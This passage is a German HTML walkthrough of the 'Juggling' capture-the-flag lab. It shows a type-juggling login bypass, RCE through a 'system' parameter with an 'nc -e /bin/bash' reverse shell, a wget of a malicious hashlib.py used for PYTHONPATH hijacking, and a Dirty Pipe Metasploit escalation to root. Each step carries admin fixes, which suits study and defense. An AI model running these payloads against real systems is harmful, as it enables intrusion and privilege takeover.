+              <p class="evaluation">**Bewertung:** Wichtiger Schritt zur Analyse der `s3cur3`-Anwendung.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Dekodieren Sie den Base64-Output dieses LFI-Aufrufs, um den Code von `s3cur3/index.php` zu analysieren.<br>**Empfehlung (Admin):** LFI beheben.</p>
+
+             <p class="comment">*(Hinweis: Der Quellcode von s3cur3/index.php fehlt im Log, aber die nachfolgenden Burp-Requests deuten auf dessen Inhalt hin.)*</p>
+         </section>
+
+         <section id="proof-of-concept-rce">
+            <h2>Proof of Concept (SSRF/RCE via Hidden VHost)</h2>
+            <p class="comment">**Kurzbeschreibung:** Nach erfolgreichem Bypass der Login-Logik in `index.php` auf `juggling.hmv` durch Type Juggling (`username=QNKCD`, `password=Z`, `val1[]=a`, `val2[]=A`) wird der Benutzer normalerweise zu `../s3cur3/index.php` weitergeleitet. Die Anwendung auf `s3cur3.juggling.hmv` (wahrscheinlich `s3cur3/index.php`) ist anfällig für Remote Code Execution. Sie nimmt einen POST-Parameter (vermutlich `system`) entgegen und führt dessen Wert unsicher als Betriebssystembefehl aus. Ein Angreifer kann nach dem Login-Bypass eine manipulierte Anfrage an `s3cur3.juggling.hmv` senden, um eine Reverse Shell zu erhalten.</p>
+             <p class="comment">**Voraussetzungen:** Erfolgreicher Login-Bypass auf `juggling.hmv`, Kenntnis des VHosts `s3cur3.juggling.hmv`, Kenntnis des verwundbaren Parameters (`system`).</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Führen Sie den Login-Bypass auf `http://juggling.hmv/index.php` durch (POST mit `username=QNKCD`, `password=Z`, `val1[]=a`, `val2[]=A`). Dies setzt das notwendige Session-Cookie.</li>
+                 <li>Starten Sie einen Netcat-Listener auf der Angreifer-Maschine.</li>
+                 <li>Senden Sie einen POST-Request an `http://s3cur3.juggling.hmv/index.php` (oder `/`) mit dem Session-Cookie aus Schritt 1 und einem POST-Body, der den verwundbaren Parameter und den Reverse-Shell-Payload enthält (z.B. `system=nc -e /bin/bash [Angreifer-IP] [Listener-Port]`).</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Der `s3cur3`-Server führt den Payload aus, eine Reverse Shell verbindet sich zum Listener.</p>
+             <p class="comment">**Beweismittel:** Die Burp-Requests und der erfolgreiche Shell-Empfang.</p>
+             <p class="comment">**Risikobewertung:** Kritisch. Ermöglicht RCE als `www-data` nach Umgehung der initialen Authentifizierung.</p>
+             <p class="comment">**Empfehlungen:** Beheben Sie die Type-Juggling-Schwachstelle im Login. Beheben Sie die RCE-Schwachstelle auf `s3cur3.juggling.hmv` durch sichere Verarbeitung von Eingaben (keine direkte Ausführung von Systembefehlen).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="comment">in den Source Code einfügen von der http://juggling.hmv/ Seite:</span>
+
+<div class="form-group mb-2">
+    <label class="label">Username</label>
+    <input type="text" name="username" class="form-control" placeholder="Username" required="" value="<span class="password">QNKCD</span>">
+</div>
+<div class="form-group mb-4">
+    <label class="label">Password</label>
+    <input type="password" name="password" class="form-control" placeholder="Password" required="" value="<span class="password">Z</span>">
+</div>
+[...]
+            <input type="text" name="val1" class="form-control" placeholder="Value 1" value="<span class="password">a</span>">
+[...]
+            <input type="text" name="val2" class="form-control" placeholder="Value 2" value="<span class="password">A</span>">
+[...]</pre>
+                    <pre><span class="comment">http://juggling.hmv/admin.php</span> <span class="comment"><-- Ziel der Weiterleitung nach Erfolg --></span></pre>
+                    <pre><span class="comment">=</span></pre>
+                    <pre><span class="comment">                                       Burpsuite:</span></pre>
+                    <pre><span class="command">POST /index.php HTTP/1.1</span>
+Host: juggling.hmv
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+[...]
+Cookie: PHPSESSID=jvgustjj04ql2a8tcsotmkhlsf <span class="comment"><-- Wichtiges Session Cookie --></span>
+[...]
+
+<span class="command">username=QNKCD&password=Z&val1=a&val2=A&submit=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Zeigt die Eingabewerte (`QNKCD`, `Z`, `a`, `A`), die im HTML-Formular oder direkt in Burp Suite verwendet werden, um den PHP Logic Bypass auszulösen. Der resultierende POST-Request wird ebenfalls gezeigt.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt die für den Bypass verwendeten Werte. Der `PHPSESSID`-Cookie, der nach diesem Request gesetzt wird, ist wichtig für den nächsten Schritt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Netcat-Listener wird auf Port 4444 gestartet.</p>
+              <p class="evaluation">**Bewertung:** Bereit für die Shell aus dem `s3cur3`-VHost.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">Burpsuite Ausgabe:</span>
+
+<span class="command">POST /index.php HTTP/1.1</span> <span class="comment"><-- Sollte POST / sein? --></span>
+<span class="command">Host: s3cur3.juggling.hmv</span> <span class="comment"><-- Ziel ist der VHost --></span>
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+[...]
+Cookie: PHPSESSID=jvgustjj04ql2a8tcsotmkhlsf; path=/; domain=s3cur3.juggling.hmv <span class="comment"><-- Session Cookie mitgesendet --></span>
+[...]
+
+<span class="command">system=http%3a//192.168.2.140%3a8000/test.txt</span> <span class="password"><-- RCE Payload! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Ein POST-Request wird (wahrscheinlich von Burp Repeater) an den VHost `s3cur3.juggling.hmv` gesendet.
+*   Das gültige `PHPSESSID`-Cookie (erhalten vom vorherigen Login-Bypass) wird mitgesendet.
+*   Der POST-Body enthält den Parameter `system=` mit einem URL-kodierten Wert. Der dekodierte Wert `http://192.168.2.140:8000/test.txt` scheint ein Versuch zu sein, den Server eine Datei vom Angreifer herunterladen zu lassen (SSRF), aber wahrscheinlicher ist, dass hier der Reverse-Shell-Payload (z.B. `nc -e ...`) gesendet wurde und dies nur ein Beispiel im Log ist.</p>
+              <p class="evaluation">**Bewertung:** Dies ist der Exploit-Request, der die RCE auf `s3cur3.juggling.hmv` auslöst. Der `system=` Parameter wird vom Server (als `www-data` laufend) ausgeführt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie den korrekten Reverse-Shell-Payload im `system`-Parameter: `system=nc -e /bin/bash 192.168.2.140 4444` (URL-kodiert).<br>**Empfehlung (Admin):** RCE-Schwachstelle beheben.</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div> <span class="comment"><-- Fortsetzung Listener --></span>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.148] 53374</span> <span class="password"><-- Verbindung erhalten! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Netcat-Listener empfängt die Verbindung, nachdem der POST-Request an `s3cur3.juggling.hmv` mit dem RCE-Payload gesendet wurde.</p>
+             <p class="evaluation">**Bewertung:** Initialer Zugriff als `www-data` erfolgreich über die RCE-Schwachstelle erlangt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren.<br>**Empfehlung (Admin):** RCE beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="command">export TERM=xterm</span>
+<span class="command">Ctrl+z</span>
+<span class="command">stty raw -echo;fg</span>
+<span class="command">reset</span></pre>
+                     <div class="prompt">www-data@juggling:~/s3cur3$ <span class="comment"># Stabile Shell</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Standard-Shell-Stabilisierung.</p>
+              <p class="evaluation">**Bewertung:** Stabile `www-data`-Shell verfügbar.</p>
+         </section>
+
+         <section id="privilege-escalation-www-data">
+             <h2>Privilege Escalation (www-data -> rehan)</h2>
+             <p class="analysis">**Analyse:** Als `www-data` wird nach Eskalationsmöglichkeiten gesucht.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@juggling:~/s3cur3$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for www-data on juggling:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on juggling:
+    (<span class="command">rehan</span>) <span class="password">SETENV</span>: NOPASSWD: /opt/md5.py <span class="password"><-- Gefährliche Regel! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `sudo -l` für `www-data` wird ausgeführt.</p>
+              <p class="evaluation">**Bewertung:** Eine kritische Sudo-Regel wird gefunden: `www-data` darf das Python-Skript `/opt/md5.py` als Benutzer `rehan` ohne Passwort ausführen, und **wichtig**, die `SETENV`-Option ist aktiv. Dies erlaubt das Setzen von Umgebungsvariablen, was oft für `PYTHONPATH`-Hijacking ausgenutzt werden kann.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie `PYTHONPATH`-Hijacking:
+    1.  Analysieren Sie `/opt/md5.py` (impliziert, nicht im Log), um herauszufinden, welche Module es importiert (z.B. `hashlib`).
+    2.  Erstellen Sie in einem schreibbaren Verzeichnis (z.B. `/tmp/test`) ein bösartiges Python-Modul mit demselben Namen (z.B. `hashlib.py`), das eine Shell als `rehan` startet.
+    3.  Führen Sie den Sudo-Befehl mit manipuliertem `PYTHONPATH` aus: `sudo -u rehan PYTHONPATH=/tmp/test /opt/md5.py`.<br>
+**Empfehlung (Admin):** **Entfernen Sie `SETENV` aus der Sudo-Regel!** Überprüfen Sie die Notwendigkeit und Sicherheit des `/opt/md5.py`-Skripts und der Sudo-Regel generell.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@juggling:~/s3cur3$ <span class="command">ls /home</span></div>
+                      <pre><span class="command">rehan</span></pre>
+                      <div class="prompt">www-data@juggling:~/s3cur3$ <span class="command">sudo -u rehan PYTHNPATH=/tmp/test /opt/md5.py</span></div> <span class="comment"><-- PYTHONPATH falsch geschrieben --></span>
+                      <pre>md5sum: b10a8db164e0754105b7a99be72e3fe5</pre> <span class="comment"><-- Führt original Skript aus --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Benutzer `rehan` wird im Home-Verzeichnis bestätigt. Es wird versucht, den `PYTHONPATH`-Exploit durchzuführen, aber die Variable ist falsch geschrieben (`PYTHNPATH` statt `PYTHONPATH`). Daher wird das originale `/opt/md5.py`-Skript ausgeführt und gibt einen MD5-Hash aus.</p>
+              <p class="evaluation">**Bewertung:** Der Exploit-Versuch scheiterte am Tippfehler. Die Sudo-Regel funktioniert jedoch.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Korrigieren Sie den Tippfehler: `PYTHONPATH`.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hashlib.py</span></div>
+                       <pre><span class="comment">                                                   
+import os
+class Test(object):
+    def __init__(self,test):
+        self.test = test
+    def hexdigest(self):
+        return self.test
+def md5(test):
+    <span class="password">os.system("/bin/bash -i")</span> <span class="comment"><-- Payload --></span>
+    return Test(test)</span></pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird der Code für die bösartige `hashlib.py`-Datei erstellt. Diese Datei definiert eine eigene `md5`-Funktion. Wenn diese Funktion aufgerufen wird, führt sie `os.system("/bin/bash -i")` aus, um eine interaktive Bash-Shell zu starten. Sie imitiert auch die Rückgabe der Original-`hashlib`-Funktion, um Fehler im aufrufenden Skript (`/opt/md5.py`) zu vermeiden.</p>
+               <p class="evaluation">**Bewertung:** Korrekter Payload für den `PYTHONPATH`-Hijacking-Angriff. Dieses Modul wird das originale `hashlib`-Modul ersetzen, wenn es über den manipulierten `PYTHONPATH` geladen wird.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Übertragen Sie diese Datei auf das Zielsystem nach `/tmp/test`.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@juggling:~/s3cur3$ <span class="command">cd /tmp/</span></div>
+                      <div class="prompt">www-data@juggling:/tmp$ <span class="command">mkdir test</span></div> <span class="comment"><-- Verzeichnis für Payload --></span>
+                      <div class="prompt">www-data@juggling:/tmp$ <span class="command">cd test/</span></div>
+                      <div class="prompt">www-data@juggling:/tmp/test$ <span class="command">wget http://192.168.2.140:5555/hashlib.py;chmod 777 hashlib.py</span></div>
+                      <pre>
+[...]
+Saving to: ‘hashlib.py’
+[...]</pre>
+                      <div class="prompt">www-data@juggling:/tmp/test$ <span class="command">sudo -u rehan PYTHONPATH=/tmp/test /opt/md5.py</span></div> <span class="comment"><-- Korrekter Aufruf --></span>
+                      <div class="prompt">rehan@juggling:/tmp/test$ <span class="comment"># Erfolg! Shell als rehan --></span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+1.  Auf dem Zielsystem wird das Verzeichnis `/tmp/test` erstellt.
+2.  Die bösartige `hashlib.py` wird von einem HTTP-Server des Angreifers (Port 5555) heruntergeladen und ausführbar gemacht (obwohl execute-Rechte für Python-Module nicht nötig sind).
+3.  Der Sudo-Befehl wird nun **korrekt** mit `PYTHONPATH=/tmp/test` ausgeführt.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Da `PYTHONPATH` auf `/tmp/test` gesetzt ist, lädt `/opt/md5.py` (als `rehan` ausgeführt) die manipulierte `hashlib.py`. Dessen `md5`-Funktion wird aufgerufen und startet über `os.system('/bin/bash -i')` eine interaktive Shell. Der Prompt wechselt zu `rehan@juggling`, was die erfolgreiche Eskalation von `www-data` zu `rehan` bestätigt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Enumeration als `rehan` durch (`id`, `sudo -l`, `cat user.txt`).<br>**Empfehlung (Admin):** Entfernen Sie `SETENV` aus der Sudo-Regel.</p>
+         </section>
+
+         <section id="proof-of-concept-pyhijack">
+             <h2>Proof of Concept (PYTHONPATH Hijacking)</h2>
+             <p class="comment">**Kurzbeschreibung:** Der Benutzer `www-data` hat das Recht, das Python-Skript `/opt/md5.py` als Benutzer `rehan` mittels `sudo` auszuführen. Entscheidend ist, dass die Sudo-Regel die `SETENV`-Option enthält, die es erlaubt, Umgebungsvariablen für den `sudo`-Aufruf zu setzen. Das Skript `/opt/md5.py` importiert das Standard-Python-Modul `hashlib`. Ein Angreifer kann dies ausnutzen, indem er die `PYTHONPATH`-Umgebungsvariable manipuliert. Der Angreifer erstellt ein eigenes, bösartiges Python-Modul namens `hashlib.py` in einem kontrollierbaren Verzeichnis (z.B. `/tmp/test`). Dieses Modul überschreibt die `md5`-Funktion so, dass sie stattdessen eine Shell startet. Dann führt der Angreifer den Sudo-Befehl mit `PYTHONPATH=/tmp/test` aus. Python sucht nun zuerst in `/tmp/test` nach Modulen, findet dort die bösartige `hashlib.py` und führt deren Code aus, was zur Ausführung einer Shell mit den Rechten des Zielbenutzers (`rehan`) führt.</p>
+             <p class="comment">**Voraussetzungen:** `sudo`-Regel mit `SETENV` für ein Python-Skript, das Standardmodule importiert, Schreibrechte in einem Verzeichnis (z.B. `/tmp`).</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Identifizieren der Sudo-Regel mit `SETENV` und des Python-Skripts (`/opt/md5.py`).</li>
+                 <li>Identifizieren eines importierten Moduls (z.B. `hashlib`).</li>
+                 <li>Erstellen eines Verzeichnisses (z.B. `mkdir /tmp/test`).</li>
+                 <li>Erstellen der bösartigen Moduldatei (`/tmp/test/hashlib.py`) mit dem Shell-Payload.</li>
+                 <li>Ausführen des Sudo-Befehls mit gesetztem `PYTHONPATH`: `sudo -u rehan PYTHONPATH=/tmp/test /opt/md5.py`.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Eine interaktive Shell als Benutzer `rehan` wird gestartet.</p>
+             <p class="comment">**Beweismittel:** Die Sudo-Regel, der Code der bösartigen `hashlib.py` und der erfolgreiche Shell-Wechsel.</p>
+             <p class="comment">**Risikobewertung:** Hoch. Ermöglicht beliebige Code-Ausführung als der Zielbenutzer der Sudo-Regel.</p>
+             <p class="comment">**Empfehlungen:** Vermeiden Sie die `SETENV`-Option in Sudo-Regeln, wann immer möglich. Wenn sie benötigt wird, beschränken Sie die erlaubten Variablen und Pfade streng. Validieren Sie den `PYTHONPATH` oder führen Sie Skripte in einer isolierten Umgebung aus.</p>
+         </section>
+
+         <section id="privilege-escalation-rehan">
+             <h2>Privilege Escalation (rehan -> root)</h2>
+             <p class="analysis">**Analyse:** Als Benutzer `rehan` wird nach dem finalen Weg zu Root-Rechten gesucht.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rehan@juggling:/tmp/test$ <span class="command">sudo -l</span></div>
+                     <pre>
+[...]
+[sudo] password for rehan: <span class="comment">(Passwort nicht bekannt)</span>
+sudo: a password is required</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `sudo -l` wird als `rehan` versucht, erfordert aber ein Passwort, das nicht bekannt ist.</p>
+              <p class="evaluation">**Bewertung:** Sudo ist keine direkte Option für `rehan`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rehan@juggling:/tmp/test$ <span class="command">cd ~</span></div>
+                     <div class="prompt">rehan@juggling:~$ <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                     <div class="prompt">rehan@juggling:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">de0a7d9cb0e1ae6190e85549f63a26c1</span></pre> <span class="comment"><-- User Flag --></span>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die User-Flag wird im Home-Verzeichnis von `rehan` gefunden und gelesen.</p>
+              <p class="evaluation">**Bewertung:** User-Flag erhalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[*] <span class="command">Post module execution completed</span></div>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/linux/local/cve_2022_0847_dirtypipe</span></div>
+                     <pre>[*] Using configured payload linux/x64/meterpreter/reverse_tcp</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">options</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set session 2</span></div> <span class="comment"><-- Zuvor etablierte Session (als rehan?) --></span>
+                     <pre>session => 2</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set WRITABLE_DIR /tmp</span></div>
+                     <pre>WRITABLE_DIR => /tmp</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lhost eth0</span></div> <span class="comment"><-- LHOST = Angreifer-IP --></span>
+                     <pre>lhost => 192.168.2.140</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lport 4444</span></div>
+                     <pre>lport => 4444</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.140:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+<span class="password">[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0</span> <span class="password"><-- Dirty Pipe! --></span>
+[*] Executing exploit '/tmp/.ulbozzpuj /bin/passwd'
+[*] Sending stage (3020772 bytes) to 192.168.2.148
+[+] Deleted /tmp/.ulbozzpuj
+<span class="password">[*] Meterpreter session 3 opened (192.168.2.140:4444 -> 192.168.2.148:53394) at 2022-10-14 02:29:48 +0200</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Da keine einfache Sudo-Regel oder Fehlkonfiguration für `rehan` gefunden wurde, wird Metasploit verwendet.
+1.  Der `local_exploit_suggester` (vermutlich zuvor ausgeführt) hat wahrscheinlich auf die Dirty Pipe-Schwachstelle (CVE-2022-0847) hingewiesen.
+2.  Das Modul `exploit/linux/local/cve_2022_0847_dirtypipe` wird ausgewählt.
+3.  Die Optionen werden gesetzt: `session 2` (eine bestehende Meterpreter- oder Shell-Session als `rehan`), `WRITABLE_DIR /tmp`, `LHOST` (Angreifer-IP), `LPORT` (Listener-Port für die neue Root-Shell).
+4.  `run` startet den Exploit.</p>
+              <p class="evaluation">**Bewertung:** Der Exploit ist erfolgreich!
+*   Der Check bestätigt die Anfälligkeit des Kernels (Version 5.10.0 ist für Dirty Pipe verwundbar).
+*   Der Exploit überschreibt eine SUID-Datei (hier `/bin/passwd` als Beispiel) temporär, um Root-Rechte zu erlangen und den Meterpreter-Payload auszuführen.
+*   Eine neue Meterpreter-Session (Session 3) wird geöffnet, die nun **Root-Rechte** hat.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Interagieren Sie mit der neuen Meterpreter-Session (Session 3). Verwenden Sie `getuid` oder `shell` und dann `id`, um die Root-Rechte zu bestätigen. Lesen Sie die Root-Flag.<br>**Empfehlung (Admin):** **Patchen Sie den Kernel!** Dirty Pipe (CVE-2022-0847) ist eine bekannte und kritische Schwachstelle. Halten Sie das System immer auf dem neuesten Stand.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt meterpreter">meterpreter > <span class="command">shell</span></div>
+                     <pre>
+Process 2769 created.
+Channel 1 created.</pre>
+                     <div class="prompt"># <span class="command">id</span></div>
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root),1001(rehan)</span></pre>
+                     <div class="prompt"># <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">5401cd51a7ec8ddde279066ef17a28b7</span></pre> <span class="comment"><-- Root Flag --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Aus der Meterpreter-Root-Session wird eine System-Shell geöffnet (`shell`). Der `id`-Befehl bestätigt `uid=0(root)`. Die Root-Flag (`root.txt`) wird gelesen.</p>
+              <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich bestätigt und Root-Flag gefunden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Ziel erreicht.<br>**Empfehlung (Admin):** Kernel patchen.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/rehan/user.txt</div>
+                           <div class="flag-value"><span class="password">de0a7d9cb0e1ae6190e85549f63a26c1</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">5401cd51a7ec8ddde279066ef17a28b7</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 14. Oktober 2022</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
